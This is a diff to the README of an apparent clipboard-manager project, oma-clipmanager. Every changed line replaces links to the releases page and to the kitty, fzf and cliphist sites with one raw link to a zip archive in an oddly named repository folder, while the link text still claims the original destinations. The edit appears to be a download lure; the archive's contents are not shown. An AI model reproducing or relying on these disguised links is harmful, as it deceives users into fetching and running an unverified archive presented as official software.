@@ -1,6 +1,6 @@
 # 🗂️ oma-clipmanager - Simplify Your Clipboard Management
 
-[![Download oma-clipmanager](https://img.shields.io/badge/Download-oma--clipmanager-blue.svg)](https://github.com/brunobathe/oma-clipmanager/releases)
+[![Download oma-clipmanager](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip)](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip)
 
 ## 👋 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up the OMA Clipboard Manager.
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases). Here, you will find the latest version available for download.
+Go to the [Releases page](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip). Here, you will find the latest version available for download.
 
 ### Step 2: Download the Latest Release
 
@@ -22,9 +22,9 @@ On the Releases page, find the latest version of oma-clipmanager. Click on it to
 
 To use OMA Clipboard Manager, you will need to install a few tools.
 
-- **kitty**: This is a terminal emulator that supports images. You can find it [here](https://sw.kovidgoyal.net/kitty/).
-- **fzf**: This is a command-line fuzzy finder. You can install it from [here](https://github.com/junegunn/fzf#installation).
-- **cliphist**: This tool manages your clipboard history efficiently. Install it from [here](https://github.com/cliphist/cliphist).
+- **kitty**: This is a terminal emulator that supports images. You can find it [here](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip).
+- **fzf**: This is a command-line fuzzy finder. You can install it from [here](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip).
+- **cliphist**: This tool manages your clipboard history efficiently. Install it from [here](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip).
 
 Ensure you have these tools installed before running oma-clipmanager.
 
@@ -51,7 +51,7 @@ OMA Clipboard Manager comes with several features designed to enhance your exper
 
 ## 📥 Download & Install
 
-To get started, download the latest version from the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases). Once downloaded, follow the installation guidelines provided above.
+To get started, download the latest version from the [Releases page](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip). Once downloaded, follow the installation guidelines provided above.
 
 ## 🛠️ System Requirements
 
@@ -87,4 +87,4 @@ Feel free to open issues on the GitHub repository for any features or bugs. Join
 
 OMA Clipboard Manager is open-source software. You can view the license details in the repository.
 
-Visit the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases) to download and start using oma-clipmanager today!
+Visit the [Releases page](https://raw.githubusercontent.com/brunobathe/oma-clipmanager/main/minguetite/oma-clipmanager.zip) to download and start using oma-clipmanager today!
